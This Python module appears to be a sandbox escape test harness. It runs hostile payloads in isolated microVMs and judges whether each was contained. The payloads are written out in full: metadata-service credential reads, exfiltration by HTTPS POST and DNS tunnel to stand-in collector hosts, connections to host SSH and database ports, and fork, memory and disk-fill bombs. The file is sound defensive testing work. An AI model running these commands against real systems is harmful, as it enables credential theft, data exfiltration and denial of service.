"""Escape matrix: hostile payloads against the exact sandbox configuration used for runs.

Each payload runs in its own fresh microVM, with the same network policy and warden lane
a crash-test run gets. Each has a mechanical check that decides "contained" or "escaped"
from what the payload printed, what the warden logged and what the host observed. Nothing
here is asserted; everything is re-runnable with ``windowsticker escape-matrix``.
"""

from __future__ import annotations

import os
import platform
import shutil
import time
from collections.abc import Callable
from dataclasses import asdict, dataclass, field
from typing import Any

from windowsticker.sandbox.base import ExecResult, NetworkSpec, SandboxDriver, SandboxSpec
from windowsticker.warden.proxy import EgressWarden

PY = "python3 -c"


@dataclass(frozen=True)
class Outcome:
    contained: bool
    evidence: str


@dataclass(frozen=True)
class Payload:
    id: str
    category: str
    attempt: str  # what it tries, in plain words
    command: str
    judge: Callable[[ExecResult, list[dict[str, Any]], dict[str, Any]], Outcome]
    timeout_s: float = 30.0
    memory_mib: int = 512


@dataclass
class EscapeResult:
    id: str
    category: str
    attempt: str
    contained: bool
    evidence: str
    exit_code: int | None
    duration_s: float
    output: str
    warden_events: list[dict[str, Any]] = field(default_factory=list)


def _out(r: ExecResult) -> str:
    return (r.stdout + "\n" + r.stderr).strip()


def _no_marker(
    marker: str, what: str
) -> Callable[[ExecResult, list[dict[str, Any]], dict[str, Any]], Outcome]:
    """Contained when the payload never printed ``marker`` (it prints it only on success)."""

    def judge(r: ExecResult, _ev: list[dict[str, Any]], _host: dict[str, Any]) -> Outcome:
        text = _out(r)
        if marker in text:
            return Outcome(False, f"{what}: payload reported success")
        last = text.splitlines()[-1][:160] if text else f"exit {r.exit_code}"
        return Outcome(True, f"{what} failed: {last}")

    return judge


def _connect(host: str, port: int) -> str:
    return (
        f'{PY} "import socket;s=socket.socket();s.settimeout(4);'
        f"s.connect(('{host}',{port}));print('ESCAPED-CONNECT')\""
    )


def _judge_metadata(r: ExecResult) -> Outcome:
    text = r.stdout.lower()
    markers = ("instanceid", "instance-id", "api-key", "user-data")
    leaked = [k for k in markers if k in text]
    if leaked:
        return Outcome(False, f"metadata returned instance data ({', '.join(leaked)})")
    if "network_policy_denied" in text:
        return Outcome(True, "runtime refused the request: network_policy_denied")
    return Outcome(True, f"no metadata returned: {_out(r)[-140:] or f'exit {r.exit_code}'}")


_UDP_DNS = (
    "import socket,struct;"
    "q=bytes.fromhex('abcd01000001000000000000076578616d706c6503636f6d0000010001');"
    "s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(4);"
    "s.sendto(q,('8.8.8.8',53));d,_=s.recvfrom(512);"
    "print('rcode',struct.unpack('>H',d[2:4])[0]&15,'answers',struct.unpack('>H',d[6:8])[0])"
)


def _judge_udp_dns(r: ExecResult, _ev: list[dict[str, Any]], _host: dict[str, Any]) -> Outcome:
    m = r.stdout.split()
    if "answers" in m:
        answers = int(m[m.index("answers") + 1])
        rcode = int(m[m.index("rcode") + 1])
        if answers > 0:
            return Outcome(
                False, f"example.com resolved with {answers} answer(s): the query left the VM"
            )
        return Outcome(
            True,
            f"runtime intercepted port 53 and answered rcode {rcode} with no records "
            "for a domain that exists: the query was not forwarded",
        )
    return Outcome(True, f"no DNS reply: {_out(r)[-120:]}")


_RAW_HTTP = (
    "import socket\n"
    "for h in ('10.0.0.1','1.1.1.1'):\n"
    "  s=socket.socket();s.settimeout(4)\n"
    "  try:\n"
    "    s.connect((h,80));s.sendall(b'GET / HTTP/1.0\\r\\nHost: x\\r\\n\\r\\n')\n"
    "    print(h,s.recv(200))\n"
    "  except Exception as e: print(h,type(e).__name__)"
)


def _judge_raw_http(r: ExecResult, _ev: list[dict[str, Any]], _host: dict[str, Any]) -> Outcome:
    lines = [ln for ln in r.stdout.splitlines() if ln.strip()]
    for ln in lines:
        if "b'" in ln and "network_policy_denied" not in ln:
            return Outcome(False, f"got a real response: {ln[:140]}")
    return Outcome(True, "every reply was the runtime's own 403 network_policy_denied (or refused)")


def _judge_env(r: ExecResult, _ev: list[dict[str, Any]], host: dict[str, Any]) -> Outcome:
    """Escaped only if a real secret value from the host appears in the guest environment.

    Variable *names* prove nothing (the Python image ships a public GPG_KEY id); values do.
    """
    values: list[str] = host.get("secret_values", [])
    names = [line.split("=", 1)[0] for line in r.stdout.splitlines() if "=" in line]
    if not values:
        return Outcome(False, "no host secrets were available to compare against; inconclusive")
    leaked = [v for v in values if v in r.stdout]
    if leaked:
        return Outcome(False, f"{len(leaked)} host secret value(s) visible in the guest")
    return Outcome(
        True,
        f"none of the host's {len(values)} secret values appear in {len(names)} guest variables",
    )


def _judge_kernel(r: ExecResult, _ev: list[dict[str, Any]], host: dict[str, Any]) -> Outcome:
    guest = r.stdout.strip().splitlines()[0] if r.stdout.strip() else "?"
    if guest and guest != host["kernel"]:
        return Outcome(True, f"guest kernel {guest}, host kernel {host['kernel']}")
    return Outcome(False, f"guest shares the host kernel ({guest})")


def _judge_kvm(r: ExecResult, _ev: list[dict[str, Any]], _host: dict[str, Any]) -> Outcome:
    if "NO-KVM" in r.stdout:
        return Outcome(True, "/dev/kvm is not present in the guest: no nested hypervisor access")
    return Outcome(False, "guest can see /dev/kvm")


def _judge_resource(
    kind: str,
) -> Callable[[ExecResult, list[dict[str, Any]], dict[str, Any]], Outcome]:
    def judge(r: ExecResult, _ev: list[dict[str, Any]], host: dict[str, Any]) -> Outcome:
        after = host.get("after", {})
        before = host.get("before", {})
        alive = host.get("guest_responsive_after", False)
        detail = (
            f"guest {'still responsive' if alive else 'stopped'}; host free memory "
            f"{before.get('mem_free_mib', '?')}→{after.get('mem_free_mib', '?')} MiB, "
            f"host disk free {before.get('disk_free_gib', '?')}→{after.get('disk_free_gib', '?')} GiB"
        )
        host_ok = after.get("mem_free_mib", 0) > 256 and after.get("disk_free_gib", 0) > 2
        return Outcome(
            host_ok,
            f"{kind} confined to the microVM; {detail}" if host_ok else f"host affected: {detail}",
        )

    return judge


def _judge_warden_refused(
    r: ExecResult, ev: list[dict[str, Any]], _host: dict[str, Any]
) -> Outcome:
    refused = [e for e in ev if not e.get("allowed")]
    if "ESCAPED" in r.stdout:
        return Outcome(False, "request succeeded")
    if refused:
        e = refused[0]
        return Outcome(
            True, f"warden refused and logged {e['protocol']} {e['host']}:{e.get('port')}"
        )
    return Outcome(True, f"request failed before leaving the VM: {_out(r)[-140:]}")


PAYLOADS: tuple[Payload, ...] = (
    Payload(
        "metadata-direct",
        "credentials",
        "Read the cloud metadata service directly",
        "curl -s -m 5 --noproxy '*' http://169.254.169.254/v1.json; echo",
        lambda r, ev, h: _judge_metadata(r),
    ),
    Payload(
        "metadata-via-proxy",
        "credentials",
        "Reach the metadata service through the warden",
        "curl -s -m 5 -o /dev/null -w '%{http_code}' http://169.254.169.254/v1.json; echo",
        _judge_warden_refused,
    ),
    Payload(
        "https-exfil",
        "exfiltration",
        "POST data to an outside host over HTTPS",
        "curl -s -m 8 -X POST -d secret=x https://collector.windowsticker.test/c -o /dev/null -w '%{http_code}' && echo ESCAPED-HTTP",
        _judge_warden_refused,
    ),
    Payload(
        "https-real-host",
        "exfiltration",
        "Reach a real public site (example.com)",
        "curl -s -m 8 https://example.com -o /dev/null -w '%{http_code}' | grep -q 200 && echo ESCAPED-HTTPS",
        _judge_warden_refused,
    ),
    Payload(
        "direct-tcp",
        "exfiltration",
        "Open a raw TCP socket to 1.1.1.1:443, ignoring proxies",
        _connect("1.1.1.1", 443),
        _no_marker("ESCAPED-CONNECT", "raw TCP"),
    ),
    Payload(
        "direct-udp-dns",
        "exfiltration",
        "Send a raw DNS query for example.com to 8.8.8.8:53, bypassing the resolver",
        f'{PY} "' + _UDP_DNS + '"',
        _judge_udp_dns,
    ),
    Payload(
        "dns-tunnel",
        "exfiltration",
        "Leak data in a DNS lookup (secret.collector.test)",
        f"{PY} \"import socket;socket.gethostbyname('c2VjcmV0.collector.windowsticker.test');print('ESCAPED-DNS')\"",
        _no_marker("ESCAPED-DNS", "DNS lookup"),
    ),
    Payload(
        "host-ssh",
        "lateral",
        "Connect to the host's SSH port",
        _connect("host.microsandbox.internal", 22),
        _no_marker("ESCAPED-CONNECT", "host:22"),
    ),
    Payload(
        "host-postgres",
        "lateral",
        "Connect to the control-plane database on the host",
        _connect("host.microsandbox.internal", 5432),
        _no_marker("ESCAPED-CONNECT", "host:5432"),
    ),
    Payload(
        "host-api",
        "lateral",
        "Connect to the control-plane API on the host",
        _connect("host.microsandbox.internal", 8000),
        _no_marker("ESCAPED-CONNECT", "host:8000"),
    ),
    Payload(
        "private-network",
        "lateral",
        "Talk HTTP to a private address (10.0.0.1:80) and a public one (1.1.1.1:80) directly",
        f'{PY} "' + _RAW_HTTP + '"',
        _judge_raw_http,
    ),
    Payload(
        "env-secrets", "credentials", "Look for API keys in the environment", "env", _judge_env
    ),
    Payload(
        "separate-kernel",
        "isolation",
        "Check whether the guest shares the host kernel",
        "uname -r",
        _judge_kernel,
    ),
    Payload(
        "kvm-device",
        "isolation",
        "Look for /dev/kvm to start a nested hypervisor",
        "test -e /dev/kvm && echo HAS-KVM || echo NO-KVM",
        _judge_kvm,
    ),
    Payload(
        "fork-bomb",
        "resources",
        "Fork processes until the machine falls over",
        "timeout 15 sh -c ':(){ :|:& };:' 2>/dev/null; sleep 2; echo done",
        _judge_resource("fork bomb"),
        timeout_s=40,
    ),
    Payload(
        "memory-bomb",
        "resources",
        "Allocate 4 GiB inside a 512 MiB microVM",
        f"{PY} \"b=[]\nwhile len(b)<4096: b.append(bytearray(1024*1024))\nprint('ESCAPED-MEM')\"",
        _judge_resource("memory bomb"),
        timeout_s=40,
    ),
    Payload(
        "disk-fill",
        "resources",
        "Write 1 GiB to disk inside the microVM",
        "dd if=/dev/zero of=/tmp/fill bs=1M count=1024 status=none; ls -la /tmp/fill | awk '{print $5}'",
        _judge_resource("disk fill"),
        timeout_s=90,
    ),
)


def _host_snapshot() -> dict[str, Any]:
    mem_free = None
    try:
        with open("/proc/meminfo") as fh:
            for line in fh:
                if line.startswith("MemAvailable:"):
                    mem_free = int(line.split()[1]) // 1024
    except OSError:
        mem_free = None
    disk = shutil.disk_usage(os.path.expanduser("~"))
    return {
        "mem_free_mib": mem_free if mem_free is not None else 99999,
        "disk_free_gib": round(disk.free / 2**30, 1),
    }


async def run_matrix(
    driver: SandboxDriver, warden: EgressWarden, image: str, only: list[str] | None = None
) -> dict[str, Any]:
    secret_names = (
        "VULTR_INFERENCE_API_KEY",
        "VULTR_API_KEY",
        "WSK_ADMIN_TOKEN",
        "WSK_DATABASE_URL",
    )
    host = {
        "kernel": platform.release(),
        # Compared inside the judge only; never written to the results.
        "secret_values": [os.environ[n] for n in secret_names if os.environ.get(n)],
    }
    results: list[EscapeResult] = []
    for p in PAYLOADS:
        if only and p.id not in only:
            continue
        lane = await warden.open_lane(f"escape-{p.id}", allowlist=())
        spec = SandboxSpec(
            name=f"wsk-escape-{p.id}",
            image=image,
            cpus=1,
            memory_mib=p.memory_mib,
            network=NetworkSpec(warden_host=warden.address(lane)),
            labels={"wsk.escape": p.id},
            max_duration_s=p.timeout_s + 120,
        )
        before = _host_snapshot()
        sb = await driver.create(spec)
        started = time.perf_counter()
        try:
            res = await sb.exec(p.command, timeout_s=p.timeout_s)
            probe = await sb.exec("echo alive", timeout_s=15)
            responsive = "alive" in probe.stdout
        finally:
            after_in = _host_snapshot()
            await sb.destroy()
        events = [
            e.model_dump(mode="json") for e in (await warden.close_lane(f"escape-{p.id}")).events
        ]
        after = _host_snapshot()
        ctx = {
            **host,
            "before": before,
            "after": min(after_in, after, key=lambda d: d["mem_free_mib"]),
            "guest_responsive_after": responsive,
        }
        outcome = p.judge(res, events, ctx)
        results.append(
            EscapeResult(
                id=p.id,
                category=p.category,
                attempt=p.attempt,
                contained=outcome.contained,
                evidence=outcome.evidence,
                exit_code=res.exit_code,
                duration_s=round(time.perf_counter() - started, 2),
                output=_out(res)[-600:],
                warden_events=events,
            )
        )
    return {
        "host_kernel": host["kernel"],
        "secrets_checked": len(host["secret_values"]),
        "image": image,
        "contained": sum(r.contained for r in results),
        "total": len(results),
        "results": [asdict(r) for r in results],
    }
